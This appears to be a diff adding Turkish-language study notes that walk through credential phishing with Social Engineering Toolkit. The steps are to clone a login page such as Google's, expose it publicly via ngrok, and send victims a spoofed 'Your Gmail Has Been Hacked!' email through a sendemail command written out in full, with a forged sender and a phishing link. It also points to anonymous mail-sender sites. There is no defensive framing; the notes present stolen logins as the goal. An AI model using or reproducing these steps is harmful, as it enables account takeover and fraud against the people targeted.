@@ -1,0 +1,51 @@
+	Social Engineering Toolkit
+ Sosyal Mühendislik aracı; siteleri klonlama, 
+ şifreleri ele geçirmek için fake websiteleri tasarlama, 
+ backdoor ya da zararlı yazılım oluşturma.
+
+ Bu araç Köprü Bağdaştırıcısında daha iyi çalışır.
+ 
+
+setoolkit	-> Yazarak çalıştırılır.
+1		-> Sosyal Mühendislik saldırılarını barındırır.
+2		-> Website saldırıları ile çalışacağız.
+3		-> Kullanıcıların hesap bilgilerini çalmaya odaklı olan bir modül.
+1		-> 1- Hazır Templates	2-Site Klonlamak için kullanılır.
+		-> 10.0.2.10 Buradaki adres yalnızca bizim kalimizde açılır, web sitemizi herkese açmak için ngrok adlı aracı kullanacağız.
+		-> Setoolkit ile ise apache server'ımıza twitter gibi sitelerin içeriğini yerleştirmeye yarar.
+ setoolkit'in istediği adrese ngrok'un bize verdiği adresi yazmamız gerekiyor.
+
+cd Downloads/
+./ngrok http 80		http://4ff3-78-170-50-66.ngrok.io	-> Bu adresi direkt olarak setoolkit'e yapıştırabiliriz.
+								-> IP adresi vermek daha sağlıklı, ip adresini öğrenmek için;
+								-> ping 4ff3-78-170-50-66.ngrok.io Burada gözüken ip adresini setoolkit'e yapıştırabiliriz. (3.22.30.40)
+2	-> Google						-> 2 Yöntemi de deneyebilirsiniz.
+
+ Web sitemiz Hazır!
+ Artık http://4ff3-78-170-50-66.ngrok.io adresi ile fake web sitemize erişimi herkese açtık.
+ Kullanıcı buraya bilgilerini girerse direkt olarak bize düşecektir.
+
+
+
+
+	Nasıl Fake Email Yollanır?
+ Oluşturmuş olduğumuz bu siteyi kurbanımızın mail'ine yollamamız gerekiyor.
+ Bunun için sendeamil adlı bir sunucuyu kullanacağız.
+ 
+sendemail -f admin@gmail.com -t turgaykarabey37@gmail.com -s smtp.gmail.com:587 -xu ryz3nnn@gmail.com -xp "passwd" -u "Your Gmail Has Been Hacked!" -m "Your gmail password has been compromised, you need to change it from this link: https://4ff3-78-170-50-66.ngrok.io"
+
+ -f  -> From: Kimden geleceği
+ -t  -> Kurban: Kime gideceği
+ -s  -> smtp.gmail.com:587
+ -xu -> Hangi mail'den yollanacak (Two-Factor olmaması ve daha az güvenli uygulama erişimini açmamız gerekiyor.)
+ -xp -> Bu mail adresinin parolası
+ -u  -> Mail Başlığı
+ -m  -> Mail içeriği
+
+ Kurban vermiş olduğumuz adrese kullancı bilgilerini girerse 
+ girmiş olduğu bilgiler olarak setoolkit aracını uyandıracaktır.
+ ve Hesap bilgilerine bu araçtan erişim sağlayabiliyoruz.
+
+  NOT: Setoolkit ile yollamamıza Gmail izin vermiyor.	"ngrok düzgün çalışıyor."
+ Yollamak istediğimiz mail'i "anonymous mail sender" diye search ettiğimizde çıkan sitelerden birini kullanabiliriz.
+  bkz: mailspre.com
